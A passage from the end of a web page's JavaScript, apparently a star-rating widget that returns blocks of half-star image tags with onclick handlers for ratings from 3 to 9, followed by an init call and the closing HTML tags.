            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            case 3:
                return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            case 4:
                return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            case 5: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            case 6: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            case 7: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            case 8: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            case 9: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            default:
                break
        }
    }
    init()
</script>
</body>
</html>